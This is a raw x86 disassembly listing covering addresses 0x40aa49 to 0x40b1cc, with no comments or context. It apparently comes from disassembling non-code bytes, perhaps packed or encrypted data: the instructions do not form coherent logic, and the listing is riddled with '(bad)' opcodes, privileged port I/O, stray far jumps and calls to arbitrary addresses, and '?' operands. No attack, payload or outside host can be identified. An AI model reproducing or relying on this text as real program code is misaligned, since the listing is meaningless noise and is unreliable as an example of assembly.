  40aa49:	out    dx,eax
  40aa4a:	iret   
  40aa4b:	frndint 
  40aa4d:	xchg   edx,eax
  40aa4f:	retf   
  40aa50:	popa   
  40aa51:	dec    edi
  40aa52:	cwde   
  40aa53:	pop    edi
  40aa54:	retf   0x6b07
  40aa57:	adc    al,0xf
  40aa59:	or     DWORD PTR [ecx],esi
  40aa5b:	push   ecx
  40aa5c:	jge    0x40aa8c
  40aa5e:	shr    BYTE PTR [edi-0x1],cl
  40aa61:	repz rol BYTE PTR [edi-0x20fe6f99],cl
  40aa68:	imul   edx,DWORD PTR [esp+ecx*1],0x79158676
  40aa6f:	ret    0x52cc
  40aa72:	adc    ch,BYTE PTR [esi]
  40aa74:	jne    0x40aad4
  40aa76:	leave  
  40aa77:	dec    eax
  40aa78:	rcr    bh,0xd5
  40aa7b:	ror    BYTE PTR [edi],0x30
  40aa7e:	xchg   DWORD PTR [edi],eax
  40aa80:	lods   al,BYTE PTR ds:[esi]
  40aa81:	ds jmp 0xbb45e9d9
  40aa87:	out    0x1f,eax
  40aa89:	pop    eax
  40aa8a:	push   cs
  40aa8b:	mov    al,ds:0x88b0eb1f
  40aa90:	mov    dh,0xdb
  40aa92:	add    edx,DWORD PTR [edx]
  40aa94:	adc    al,0xdd
  40aa96:	shl    BYTE PTR [edx],1
  40aa98:	int    0x34
  40aa9a:	xchg   ebp,eax
  40aa9b:	adc    ah,0x6d
  40aa9e:	mov    edi,ds
  40aaa0:	es popf 
  40aaa2:	xor    ebp,DWORD PTR [edx-0x3e]
  40aaa5:	lods   al,BYTE PTR ds:[esi]
  40aaa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aaa7:	jae    0x40aaaf
  40aaa9:	inc    edi
  40aaaa:	sbb    eax,DWORD PTR [esi]
  40aaac:	push   ds
  40aaad:	cld    
  40aaae:	gs sub eax,0xf643b174
  40aab4:	in     eax,dx
  40aab5:	and    cl,0xee
  40aab8:	jbe    0x40ab38
  40aaba:	xor    edx,esi
  40aabc:	ja     0x40ab20
  40aabe:	jno    0x40aa4d
  40aac0:	mov    DWORD PTR [eax+0x2a],esp
  40aac3:	sbb    eax,0xbfa693aa
  40aac8:	pop    edx
  40aac9:	ret    
  40aaca:	cmp    BYTE PTR ds:0xc7e5a266,ch
  40aad0:	sbb    eax,0xe3287dc9
  40aad5:	mov    eax,0xc83589c4
  40aada:	retf   
  40aadb:	inc    edi
  40aadc:	mov    dh,0x3d
  40aade:	jo     0x40ab0f
  40aae0:	mov    ebx,0xa91ccf28
  40aae5:	fldenv [ebx-0x24]
  40aae8:	or     DWORD PTR [ecx+0x11],esp
  40aaeb:	mov    esi,0x1b962597
  40aaf0:	loope  0x40ab6c
  40aaf2:	jnp    0x40aa9d
  40aaf4:	call   0x12658fd7
  40aaf9:	jle    0x40aa94
  40aafb:	rcr    BYTE PTR [ebp-0x5e9254d2],cl
  40ab01:	lds    esp,FWORD PTR [ecx+0xe]
  40ab04:	mov    ds,ebp
  40ab06:	sbb    ebx,edi
  40ab08:	xor    ebx,DWORD PTR [ebx+eiz*8-0x172ce9d]
  40ab0f:	jl     0x40aaff
  40ab11:	adc    cl,cl
  40ab13:	lods   eax,DWORD PTR ds:[esi]
  40ab14:	mov    ecx,0xe4acf966
  40ab19:	test   cl,ah
  40ab1b:	dec    ecx
  40ab1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab1d:	and    al,0x5b
  40ab1f:	das    
  40ab20:	or     eax,0x76bba2d8
  40ab25:	lds    ebp,FWORD PTR [ebp-0x6a73cb09]
  40ab2b:	cmp    DWORD PTR [edx-0x5e918fba],edx
  40ab31:	mov    edx,0x712504a7
  40ab36:	inc    edx
  40ab37:	(bad)
  40ab3b:	push   edi
  40ab3c:	mov    BYTE PTR ds:0x4f962dc2,al
  40ab42:	std    
  40ab43:	(bad)  
  40ab44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab45:	jo     0x40ab80
  40ab47:	fist   DWORD PTR [esi+0x2ba47e4a]
  40ab4d:	gs sbb ecx,esp
  40ab50:	cmp    BYTE PTR [ebp+0x5a],cl
  40ab53:	add    ah,bh
  40ab55:	adc    eax,DWORD PTR [ebx]
  40ab57:	cmp    BYTE PTR [edx],0xfd
  40ab5a:	fdiv   st(7),st
  40ab5c:	pop    edx
  40ab5d:	arpl   WORD PTR [eax],cx
  40ab5f:	dec    ebx
  40ab60:	data16 jge 0x40aba1
  40ab63:	push   edx
  40ab64:	(bad)  
  40ab65:	cld    
  40ab66:	inc    eax
  40ab67:	clc    
  40ab68:	aas    
  40ab69:	pusha  
  40ab6a:	scas   al,BYTE PTR es:[edi]
  40ab6b:	push   ebx
  40ab6c:	push   0x29e0f026
  40ab71:	push   edx
  40ab72:	bound  esp,QWORD PTR [edi+0x39a05c28]
  40ab78:	hlt    
  40ab79:	mov    cl,0xd1
  40ab7b:	(bad)  
  40ab7c:	popa   
  40ab7d:	cmc    
  40ab7e:	(bad)  
  40ab7f:	sub    BYTE PTR [eax+ebx*2],dl
  40ab82:	out    0xa,al
  40ab84:	in     al,0xd5
  40ab86:	push   ecx
  40ab87:	sbb    ch,BYTE PTR [ebx+0x7ae25e5f]
  40ab8d:	push   0x39cf484
  40ab92:	arpl   cx,bp
  40ab94:	lods   eax,DWORD PTR ds:[esi]
  40ab95:	sti    
  40ab96:	inc    ebp
  40ab97:	pop    esi
  40ab98:	lea    ebp,[ebp+0x27358ff5]
  40ab9e:	sbb    al,0xb9
  40aba0:	les    ecx,FWORD PTR [eax+0x7f]
  40aba3:	int    0xc2
  40aba5:	add    eax,0x1368622
  40abaa:	jg     0x40ac04
  40abac:	sbb    bh,dh
  40abae:	pop    ds
  40abaf:	sti    
  40abb0:	adc    edi,ebx
  40abb2:	jmp    0x40ab56
  40abb4:	jp     0x40ab64
  40abb6:	or     dl,BYTE PTR [edi-0x6b]
  40abb9:	call   0x80ec7854
  40abbe:	mov    esi,0x84f82e56
  40abc3:	(bad)
  40abc6:	popf   
  40abc7:	mov    edi,0x4767ea0f
  40abcc:	aam    0xa5
  40abce:	and    eax,0x8c40f867
  40abd3:	sub    eax,0xbe29937e
  40abd8:	add    al,bl
  40abda:	jle    0x40abb0
  40abdc:	rol    DWORD PTR [edi+0x67c3f343],cl
  40abe2:	mov    eax,ds:0x12339a49
  40abe7:	aas    
  40abe8:	loop   0x40ac2c
  40abea:	mov    cl,BYTE PTR [edx-0xb5049bb]
  40abf0:	cmp    DWORD PTR [ebp-0x235e43ed],esp
  40abf6:	sub    al,0x7e
  40abf8:	push   cs
  40abf9:	sbb    DWORD PTR [eax],esp
  40abfb:	(bad)  
  40abfc:	sbb    eax,0xe3304481
  40ac01:	mov    ah,0xd7
  40ac03:	mov    al,ds:0x93e1d6fb
  40ac08:	push   es
  40ac09:	sub    ebp,esp
  40ac0b:	jmp    0x567053b7
  40ac10:	mov    dh,0xe1
  40ac12:	mov    ch,0xdf
  40ac14:	lds    eax,FWORD PTR [edi-0x9]
  40ac17:	int3   
  40ac18:	mov    eax,ds:0x97944d1e
  40ac1d:	pop    edi
  40ac1e:	imul   edi,DWORD PTR fs:[ebx],0xa3742797
  40ac25:	mov    dh,0xe5
  40ac27:	inc    BYTE PTR [edi+0x61]
  40ac2a:	mov    ecx,esp
  40ac2c:	aas    
  40ac2d:	sub    eax,0x5ad7fbd8
  40ac32:	test   al,0xb6
  40ac34:	mov    ebp,0x7e51e56c
  40ac39:	fdivr  QWORD PTR ds:0x253b3758
  40ac3f:	(bad)  
  40ac40:	adc    eax,0x60f8ac3c
  40ac45:	not    DWORD PTR [ebx+0x53]
  40ac48:	mov    WORD PTR [edx],es
  40ac4a:	mov    eax,ds:0x53de0fe3
  40ac4f:	or     al,0x19
  40ac51:	and    ch,dh
  40ac53:	call   0x3138:0x9800c2ca
  40ac5a:	neg    al
  40ac5c:	cmp    eax,0x75f99d8f
  40ac61:	xchg   ecx,eax
  40ac62:	push   0x6
  40ac64:	(bad)  
  40ac65:	arpl   WORD PTR [edi],sp
  40ac67:	push   esi
  40ac68:	inc    ebx
  40ac69:	pusha  
  40ac6a:	pusha  
  40ac6b:	mov    bh,0xf8
  40ac6d:	mov    edi,0xe9d15fa7
  40ac72:	in     al,dx
  40ac73:	lock inc edx
  40ac75:	mov    cl,0x6c
  40ac77:	ror    BYTE PTR [eax-0x73af77b4],cl
  40ac7d:	adc    BYTE PTR [edx],ah
  40ac7f:	stos   DWORD PTR es:[edi],eax
  40ac80:	cld    
  40ac81:	mov    bh,0x52
  40ac83:	mov    esi,0x134fe77b
  40ac88:	fst    DWORD PTR [ecx+0x7c]
  40ac8b:	adc    bh,cl
  40ac8d:	stc    
  40ac8e:	xchg   edx,eax
  40ac8f:	ret    
  40ac90:	or     BYTE PTR [edx],0x80
  40ac93:	rcl    BYTE PTR [ebp+0x4452b137],cl
  40ac99:	pushf  
  40ac9a:	clc    
  40ac9b:	push   es
  40ac9c:	ret    0x1634
  40ac9f:	loopne 0x40ad06
  40aca1:	mov    eax,0x76285229
  40aca6:	jl     0x40ac55
  40aca8:	dec    ebp
  40aca9:	ins    BYTE PTR es:[edi],dx
  40acaa:	retf   
  40acab:	jno    0x40ac2e
  40acad:	jne    0x40acc0
  40acaf:	xor    DWORD PTR [ebx+0x8205522],ecx
  40acb5:	or     BYTE PTR [ebx+0x6a1bcd93],0xa0
  40acbc:	pop    ss
  40acbd:	cwde   
  40acbe:	jo     0x40ac62
  40acc0:	jns    0x40ac64
  40acc2:	push   cs
  40acc3:	adc    ecx,ebp
  40acc5:	(bad)  
  40acc6:	ins    BYTE PTR es:[edi],dx
  40acc7:	mov    edi,0xe94996f3
  40accc:	or     al,0xf9
  40acce:	xor    DWORD PTR [ecx+0x3b5ccd0c],ebp
  40acd4:	mov    DWORD PTR [ebx+ebx*4-0x30],esp
  40acd8:	dec    edi
  40acd9:	adc    eax,0xd5aa9753
  40acde:	test   al,0x40
  40ace0:	sbb    DWORD PTR ds:0x438b5f48,ebx
  40ace6:	sbb    ch,ah
  40ace8:	(bad)  
  40ace9:	xchg   ebx,eax
  40acea:	fiadd  WORD PTR [ecx+ecx*2-0x4527b531]
  40acf1:	dec    ecx
  40acf2:	or     ah,BYTE PTR [ebp-0x9276bc5]
  40acf8:	adc    dh,al
  40acfa:	mov    ecx,0xd3f46e0b
  40acff:	rol    DWORD PTR [esi+0x14],1
  40ad02:	ret    
  40ad03:	aad    0x42
  40ad05:	sub    DWORD PTR [edx+0x67ca6f8],ebx
  40ad0b:	pushf  
  40ad0c:	ja     0x40ad0f
  40ad0e:	data16 mov ds,WORD PTR [ecx+0x40]
  40ad12:	and    al,0xaa
  40ad14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad15:	dec    ebx
  40ad16:	(bad)  
  40ad17:	xchg   edx,eax
  40ad18:	shl    BYTE PTR [esi],0x6c
  40ad1b:	aaa    
  40ad1c:	xchg   edi,eax
  40ad1d:	mov    al,0x44
  40ad1f:	jmp    0x66a6:0x3a8baa86
  40ad26:	xchg   edx,eax
  40ad27:	shl    ebx,1
  40ad29:	dec    ebx
  40ad2a:	dec    ebp
  40ad2b:	fld    QWORD PTR [edx-0x32]
  40ad2e:	push   edi
  40ad2f:	xor    bh,al
  40ad31:	or     BYTE PTR [ecx+0x74],al
  40ad34:	inc    edx
  40ad35:	push   esi
  40ad36:	cmp    DWORD PTR [esi],esp
  40ad38:	jecxz  0x40ad0e
  40ad3a:	fld    QWORD PTR [ebp+0x155e3cab]
  40ad40:	and    DWORD PTR [ecx],edx
  40ad42:	cmp    bh,0xcf
  40ad45:	dec    esi
  40ad46:	stos   DWORD PTR es:[edi],eax
  40ad47:	retf   0x9fa8
  40ad4a:	in     al,0xe1
  40ad4c:	mov    ah,BYTE PTR ds:0xb2851a72
  40ad52:	mov    bh,0xbd
  40ad54:	out    0x44,eax
  40ad56:	rol    BYTE PTR ds:0xb3675477,0x76
  40ad5d:	mov    esp,0xb6836b2a
  40ad62:	pop    ss
  40ad63:	mov    esp,0x6472ceb7
  40ad68:	(bad)  
  40ad69:	push   esp
  40ad6a:	fimul  DWORD PTR [esi]
  40ad6c:	xor    esp,DWORD PTR [eax-0x45]
  40ad6f:	and    al,0xd5
  40ad71:	fadd   DWORD PTR [ebx+0x3]
  40ad74:	sub    BYTE PTR [esi+0x1c995ea4],cl
  40ad7a:	aam    0x5c
  40ad7c:	das    
  40ad7d:	mov    ch,0x8c
  40ad7f:	enter  0xc3cb,0x2c
  40ad83:	outs   dx,DWORD PTR ds:[esi]
  40ad84:	sub    DWORD PTR [esi+0x57],edi
  40ad87:	mov    DWORD PTR [edx],ebp
  40ad89:	mov    BYTE PTR [edx+0x5b1643c3],ah
  40ad8f:	fld    QWORD PTR [ebx]
  40ad91:	or     bl,0xb6
  40ad94:	or     BYTE PTR [esi+0x75],bh
  40ad97:	sub    BYTE PTR [ebx],dl
  40ad99:	neg    DWORD PTR [eax]
  40ad9b:	jg     0x40add5
  40ad9d:	or     BYTE PTR [esi-0x43],al
  40ada0:	jl     0x40ad68
  40ada2:	cli    
  40ada3:	dec    ecx
  40ada4:	mul    DWORD PTR [eax+0x11]
  40ada7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ada8:	punpckhwd mm4,QWORD PTR [ebx+0x44f28c8b]
  40adaf:	add    eax,0x72a6a54f
  40adb4:	hlt    
  40adb5:	shl    BYTE PTR [ecx+0x3a],0xb9
  40adb9:	jbe    0x40ae0a
  40adbb:	imul   edi,DWORD PTR [edx+0x552e4b83],0xf105711c
  40adc5:	mov    ch,0xa4
  40adc7:	xchg   esi,eax
  40adc8:	fld    DWORD PTR [esi]
  40adca:	dec    ecx
  40adcb:	xchg   ecx,eax
  40adcc:	repz mov bl,0xf8
  40adcf:	cli    
  40add0:	in     al,0x9
  40add2:	loop   0x40ad88
  40add4:	jo     0x40ae19
  40add6:	add    al,0xe7
  40add8:	xor    eax,0x8c785be5
  40addd:	loop   0x40ad82
  40addf:	push   edi
  40ade0:	adc    esi,DWORD PTR [edx]
  40ade2:	mov    eax,ds:0x2f391713
  40ade7:	mov    bh,ch
  40ade9:	pop    esp
  40adea:	or     ch,BYTE PTR [esi]
  40adec:	int3   
  40aded:	jge    0x40ae14
  40adef:	sti    
  40adf0:	enter  0xa77f,0x0
  40adf4:	fist   WORD PTR [ecx]
  40adf6:	fld    TBYTE PTR [ebp-0x2d]
  40adf9:	or     DWORD PTR cs:[edx-0x2f],eax
  40adfd:	and    al,0xe1
  40ae00:	mov    WORD PTR [edx+0x5d],?
  40ae03:	jbe    0x40ae5f
  40ae05:	sbb    BYTE PTR [ecx],ah
  40ae07:	mov    ?,WORD PTR [edx]
  40ae09:	in     al,dx
  40ae0a:	outs   dx,BYTE PTR ds:[esi]
  40ae0b:	leave  
  40ae0c:	(bad)  
  40ae0d:	test   al,0xf4
  40ae0f:	or     DWORD PTR [ecx-0x80],ebp
  40ae12:	push   esp
  40ae13:	sub    ebx,DWORD PTR [edx+0x71fc3e91]
  40ae19:	les    esp,FWORD PTR [edi-0x10211ce6]
  40ae1f:	or     DWORD PTR [esi],ebp
  40ae21:	inc    cl
  40ae23:	(bad)  
  40ae24:	fisubr WORD PTR [ecx+0x71]
  40ae27:	and    DWORD PTR [eax],0xf59c750f
  40ae2d:	adc    bl,bl
  40ae2f:	cmp    bh,BYTE PTR [eax-0x722f301d]
  40ae35:	fisubr DWORD PTR [edi-0x6f]
  40ae38:	les    ebp,FWORD PTR [ebx-0x780c73a0]
  40ae3e:	lea    esp,[ebx]
  40ae40:	out    0xd9,al
  40ae42:	push   ebp
  40ae43:	outs   dx,BYTE PTR ds:[esi]
  40ae44:	mov    dl,0xdd
  40ae46:	test   eax,0xcd7bbe2f
  40ae4b:	sbb    ebp,edi
  40ae4d:	sbb    BYTE PTR [esi],ah
  40ae4f:	int    0x13
  40ae51:	or     al,0xec
  40ae53:	fadd   DWORD PTR [edi+eax*4]
  40ae56:	pop    eax
  40ae57:	and    eax,0xb443be03
  40ae5c:	jl     0x40adef
  40ae5e:	cmp    esp,DWORD PTR [edx-0x62ab1578]
  40ae64:	sub    ebx,DWORD PTR ds:[ecx+0x41e2686b]
  40ae6b:	jge    0x40ae26
  40ae6d:	xor    eax,0xc8649d55
  40ae72:	inc    ecx
  40ae73:	cdq    
  40ae74:	fisttp QWORD PTR [edi]
  40ae76:	dec    eax
  40ae77:	imul   esi,DWORD PTR [edx+0x1e],0xd4b2f099
  40ae7e:	enter  0xbb79,0x9b
  40ae82:	(bad)  
  40ae83:	nop
  40ae84:	xchg   BYTE PTR [ecx-0x76],dh
  40ae87:	xchg   edx,eax
  40ae88:	test   ah,ah
  40ae8a:	and    al,0x2a
  40ae8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae8d:	mov    dl,0x1a
  40ae8f:	sbb    BYTE PTR [ecx-0x1b],bh
  40ae92:	dec    ebx
  40ae93:	and    BYTE PTR [ecx-0x54],bl
  40ae96:	push   ecx
  40ae97:	mov    DWORD PTR [edi+0xbb8ca98],0x4ee43c34
  40aea1:	and    eax,0x93877992
  40aea6:	ror    DWORD PTR [esi-0x3ba447b2],1
  40aeac:	pop    ds
  40aead:	add    eax,0xfd84fd21
  40aeb2:	sahf   
  40aeb3:	and    DWORD PTR [edi+0x2f3d5381],ebx
  40aeb9:	gs xchg esi,eax
  40aebb:	sbb    edx,ebp
  40aebd:	push   ebx
  40aebe:	jnp    0x40aef4
  40aec0:	clc    
  40aec1:	inc    edi
  40aec2:	aas    
  40aec3:	add    esi,DWORD PTR [esi-0x74]
  40aec6:	shl    BYTE PTR [ebp-0xf8edd72],0xa7
  40aecd:	adc    DWORD PTR [edx+0x4d],ebx
  40aed0:	clc    
  40aed1:	mov    bh,0x89
  40aed3:	inc    edx
  40aed4:	pop    ebx
  40aed5:	adc    BYTE PTR [eax+0x3bc2ab16],cl
  40aedb:	(bad)  
  40aedd:	scas   eax,DWORD PTR es:[edi]
  40aede:	adc    DWORD PTR [eax+0x25],edx
  40aee1:	sub    ah,BYTE PTR [ebx-0x5a]
  40aee4:	dec    edx
  40aee5:	pop    es
  40aee6:	adc    al,0x39
  40aee8:	sbb    DWORD PTR [esi],edx
  40aeea:	add    ecx,DWORD PTR [esp+eax*8]
  40aeed:	jno    0x40af2f
  40aeef:	scas   eax,DWORD PTR es:[edi]
  40aef0:	mov    BYTE PTR [esi+0x6873b24b],al
  40aef6:	fld    QWORD PTR [eax-0x74]
  40aef9:	xchg   edx,eax
  40aefa:	mov    fs,WORD PTR [eax]
  40aefc:	push   edx
  40aefd:	push   edi
  40aefe:	stos   BYTE PTR es:[edi],al
  40aeff:	mov    ah,cl
  40af01:	sub    edx,edx
  40af03:	dec    esp
  40af04:	xor    eax,0x2617e1c1
  40af09:	mov    edi,0xcb2484f2
  40af0e:	shl    edi,0x41
  40af11:	jo     0x40aeb9
  40af13:	imul   ebp,DWORD PTR [esi-0x46a488bc],0xe4148084
  40af1d:	jbe    0x40aed2
  40af1f:	out    0x9f,eax
  40af21:	cs add al,0xa2
  40af24:	call   0x305e5906
  40af29:	jl     0x40aee7
  40af2b:	lds    esp,FWORD PTR [edx+eiz*1-0x28]
  40af2f:	push   ebx
  40af30:	repnz xchg ecx,eax
  40af32:	add    BYTE PTR ds:[ecx],cl
  40af35:	xchg   esp,eax
  40af36:	ret    0x9a37
  40af39:	mov    ebx,0x1b9aac71
  40af3e:	pop    eax
  40af3f:	or     dl,BYTE PTR [ebx-0x65298e81]
  40af45:	or     al,ch
  40af47:	sub    DWORD PTR [esi+0x76c1f6a2],esi
  40af4d:	inc    edi
  40af4e:	sub    al,0xef
  40af50:	push   es
  40af51:	fist   DWORD PTR [ebp-0x1a]
  40af55:	les    eax,FWORD PTR [edi+0x1]
  40af58:	test   al,0xa9
  40af5a:	fsubr  st(6),st
  40af5c:	adc    BYTE PTR [edx-0x6f02d684],0xf2
  40af63:	out    0xd5,eax
  40af65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af66:	rcr    BYTE PTR [eax-0xdcdd1ac],cl
  40af6c:	(bad)  
  40af6d:	pop    ss
  40af6e:	xor    eax,0x106a41ac
  40af73:	and    cl,0x6c
  40af76:	lea    ecx,[edx]
  40af78:	imul   edx,DWORD PTR [edi-0x30],0xffdfa9fb
  40af7f:	frstor [eax+ebp*1]
  40af82:	in     eax,dx
  40af83:	leave  
  40af84:	mov    ah,0x7
  40af86:	in     eax,dx
  40af87:	test   DWORD PTR [edi-0x79],0x23e48d8b
  40af8e:	popf   
  40af8f:	cmp    BYTE PTR [edx+ebp*8-0xc],cl
  40af93:	pop    edi
  40af94:	jmp    0x87278c87
  40af99:	mov    dh,ch
  40af9b:	cli    
  40af9c:	je     0x40af71
  40af9e:	call   FWORD PTR [edi+0x5c]
  40afa1:	(bad)  
  40afa3:	(bad)  
  40afa4:	rcr    DWORD PTR [esi-0xf],cl
  40afa7:	cmp    eax,0x55b0aae1
  40afac:	fincstp 
  40afae:	into   
  40afaf:	sbb    eax,0xb96a7dbf
  40afb4:	jae    0x40afed
  40afb6:	sbb    ch,ah
  40afb8:	lock push esi
  40afba:	sub    DWORD PTR [ebp-0x27843555],edi
  40afc0:	sahf   
  40afc1:	and    al,0x18
  40afc3:	rcr    BYTE PTR [ebp+0x1],0xaa
  40afc7:	pusha  
  40afc8:	sbb    eax,0x39cf82f3
  40afcd:	and    al,0x91
  40afcf:	sbb    DWORD PTR [edi+0x511f43fc],ebx
  40afd5:	pop    eax
  40afd6:	sub    BYTE PTR [eax-0x6eb9ee70],ah
  40afdc:	xchg   edi,eax
  40afdd:	popf   
  40afde:	sub    BYTE PTR [esi+0x7a097fcf],al
  40afe4:	loopne 0x40b01a
  40afe6:	dec    esi
  40afe7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40afe8:	cmc    
  40afe9:	adc    DWORD PTR [edx],esi
  40afeb:	loopne 0x40b011
  40afed:	out    0x24,eax
  40afef:	sbb    eax,0x7e81f3e1
  40aff4:	sti    
  40aff5:	pop    edx
  40aff6:	pop    ecx
  40aff7:	shl    BYTE PTR [esi-0x5b4a47a],1
  40affd:	inc    edx
  40affe:	ror    DWORD PTR [edx+0x3a],0xe9
  40b002:	lahf   
  40b003:	call   0xa0706fb4
  40b008:	mov    edx,0xb95c553b
  40b00d:	fs jae 0x7da3da55
  40b014:	shl    DWORD PTR [ecx-0x67],cl
  40b017:	sub    ecx,DWORD PTR [eax-0x5f43bfb]
  40b01d:	sar    al,1
  40b01f:	xchg   esp,eax
  40b020:	add    bl,dl
  40b022:	adc    al,0x1c
  40b024:	dec    esp
  40b025:	popf   
  40b026:	and    eax,0x7215434a
  40b02b:	jp     0x40afbc
  40b02d:	mov    esp,0xb19644a6
  40b032:	jmp    0x40afb9
  40b034:	or     DWORD PTR [eax-0x28],edx
  40b037:	dec    ebx
  40b038:	in     al,dx
  40b039:	call   0x82d8b236
  40b03e:	ins    DWORD PTR es:[edi],dx
  40b03f:	jl     0x40b05e
  40b041:	add    bl,BYTE PTR [ebp+0x5de0b15d]
  40b047:	sbb    edx,DWORD PTR ds:[ebx+0x3c]
  40b04b:	sbb    al,BYTE PTR [eax+0xbc6bc3f]
  40b051:	in     eax,dx
  40b052:	and    DWORD PTR [ebp+0x57],edi
  40b055:	pop    ebp
  40b056:	sbb    ebx,edi
  40b058:	add    al,bh
  40b05a:	fsubr  st,st(1)
  40b05c:	repz mov ch,0x7b
  40b05f:	sub    DWORD PTR [ebx],0x7d679d90
  40b065:	xor    DWORD PTR [eax+ecx*1+0x19653209],esp
  40b06c:	popf   
  40b06d:	push   edx
  40b06e:	dec    ebp
  40b06f:	lods   eax,DWORD PTR ds:[esi]
  40b070:	push   edx
  40b071:	(bad)  
  40b072:	in     eax,0x54
  40b074:	iret   
  40b075:	mov    bl,0x49
  40b077:	iret   
  40b078:	ficomp DWORD PTR [ecx]
  40b07a:	adc    esp,ebx
  40b07c:	mov    dh,0xf9
  40b07e:	fsub   DWORD PTR [edx-0x72]
  40b081:	sbb    ch,BYTE PTR [esi]
  40b083:	idiv   BYTE PTR [edi-0x1dc3fd60]
  40b089:	push   ebp
  40b08a:	cmp    al,0xe0
  40b08c:	xchg   edx,eax
  40b08d:	jp     0x40b0d1
  40b08f:	outs   dx,BYTE PTR ds:[esi]
  40b090:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b091:	test   al,0xd0
  40b093:	xchg   esi,eax
  40b094:	push   eax
  40b095:	dec    eax
  40b096:	add    al,0x92
  40b098:	out    0xf5,al
  40b09a:	ss in  eax,dx
  40b09c:	aam    0x3b
  40b09e:	arpl   WORD PTR [edx+ebp*8-0x2edb03f3],di
  40b0a5:	pop    esp
  40b0a6:	cs mov ah,0xf1
  40b0a9:	ror    DWORD PTR [edx],cl
  40b0ab:	mov    edx,DWORD PTR [ecx]
  40b0ad:	push   eax
  40b0ae:	dec    edx
  40b0af:	test   eax,0xe39bdbb3
  40b0b4:	test   BYTE PTR es:[ebp+edx*1+0x1b],bh
  40b0b9:	inc    ebx
  40b0ba:	jnp    0x40b06f
  40b0bc:	pop    edx
  40b0bd:	xchg   ecx,eax
  40b0be:	retf   0x14cc
  40b0c1:	in     eax,dx
  40b0c2:	ds sbb eax,0x6fa0d4ec
  40b0c8:	sub    al,0x87
  40b0ca:	shl    DWORD PTR [ebp+0x4df82a3a],0x2f
  40b0d1:	pop    edx
  40b0d2:	mov    WORD PTR [eax-0x3ea1257b],ss
  40b0d8:	xor    BYTE PTR [esi+0x14],dl
  40b0db:	or     ebp,edi
  40b0dd:	or     dl,BYTE PTR [ebx+edi*1]
  40b0e0:	sub    ebp,ebx
  40b0e2:	ins    DWORD PTR es:[edi],dx
  40b0e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0e4:	jne    0x40b10b
  40b0e6:	cs enter 0xc655,0x33
  40b0eb:	xor    BYTE PTR [esi],0xa3
  40b0ee:	imul   ebp,eax,0x75
  40b0f1:	pop    ebx
  40b0f2:	jb     0x40b13d
  40b0f4:	test   al,0x3c
  40b0f6:	cmp    edx,ebp
  40b0f8:	dec    ebp
  40b0f9:	xor    al,0xb
  40b0fb:	(bad)  
  40b0fd:	loop   0x40b10e
  40b0ff:	(bad)  
  40b101:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b102:	in     al,dx
  40b103:	xchg   ebx,eax
  40b104:	push   esp
  40b105:	jg     0x40b0ad
  40b107:	xor    bl,BYTE PTR [edi]
  40b109:	xchg   edi,eax
  40b10a:	jge    0x40b0f9
  40b10c:	es jo  0x40b167
  40b10f:	fsubrp st(7),st
  40b111:	dec    eax
  40b112:	sar    edx,1
  40b114:	pop    ss
  40b115:	cmp    BYTE PTR [edx-0x73],bh
  40b118:	xlat   BYTE PTR ds:[ebx]
  40b119:	push   edi
  40b11a:	push   ds
  40b11b:	out    dx,al
  40b11c:	mov    DWORD PTR [ebx+ebp*2-0x50],ecx
  40b120:	sbb    ch,BYTE PTR [ecx]
  40b122:	adc    dh,BYTE PTR [esp+ebp*8-0x637e018d]
  40b129:	or     DWORD PTR [ebp+edx*8-0x403e80dd],esi
  40b130:	xchg   DWORD PTR [esi],ecx
  40b132:	mov    al,ds:0x980c7f90
  40b137:	xor    al,0x7b
  40b139:	les    ebx,FWORD PTR [ecx-0x64]
  40b13c:	lods   eax,DWORD PTR ds:[esi]
  40b13d:	push   cs
  40b13e:	cmp    bh,ah
  40b140:	add    DWORD PTR [eax-0x7c3ed2b5],0x9729ee0c
  40b14a:	push   ds
  40b14b:	inc    eax
  40b14d:	aaa    
  40b14e:	pop    esi
  40b14f:	scas   eax,DWORD PTR es:[edi]
  40b150:	push   es
  40b151:	inc    edx
  40b152:	icebp  
  40b153:	sar    esi,0xf6
  40b156:	adc    eax,0x18e6862b
  40b15b:	xchg   esp,eax
  40b15c:	enter  0x5d9,0x21
  40b160:	rep ins BYTE PTR es:[edi],dx
  40b162:	int3   
  40b163:	retf   
  40b164:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b165:	add    DWORD PTR [ebx+eiz*8-0x6f],0xb31e2968
  40b16d:	mov    eax,0x6e8e0cf6
  40b172:	outs   dx,DWORD PTR ds:[esi]
  40b173:	mov    al,ds:0x1251ab1b
  40b178:	inc    ecx
  40b179:	inc    esp
  40b17b:	es cmp edx,eax
  40b17e:	std    
  40b17f:	push   esi
  40b180:	out    dx,al
  40b181:	mov    ecx,0x8d3585c7
  40b186:	mov    ch,0xf6
  40b188:	mov    ch,0x14
  40b18a:	out    dx,eax
  40b18b:	jno    0x40b1e0
  40b18d:	adc    eax,0xcd540824
  40b192:	and    eax,0x79b14336
  40b197:	fldenv [ecx]
  40b199:	add    DWORD PTR [edx],ebp
  40b19b:	adc    dl,bl
  40b19d:	inc    esp
  40b19e:	jbe    0x40b132
  40b1a0:	mov    bh,bh
  40b1a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1a3:	sahf   
  40b1a4:	aas    
  40b1a5:	push   edi
  40b1a6:	rcr    BYTE PTR ds:0xacf1a1de,0x23
  40b1ad:	adc    al,0x8e
  40b1af:	mov    cl,0x72
  40b1b1:	test   al,0x9e
  40b1b4:	lea    edx,[ebx-0x72ae34ff]
  40b1ba:	(bad)  
  40b1bb:	pop    es
  40b1bc:	xchg   DWORD PTR [edx],esp
  40b1be:	aas    
  40b1bf:	adc    eax,0xf5b43e8d
  40b1c4:	in     eax,0xe5
  40b1c6:	mov    dh,0xbb
  40b1c8:	fnstenv [edi]
  40b1ca:	xor    al,0xa1
  40b1cc:	fs push 0xffffffd9
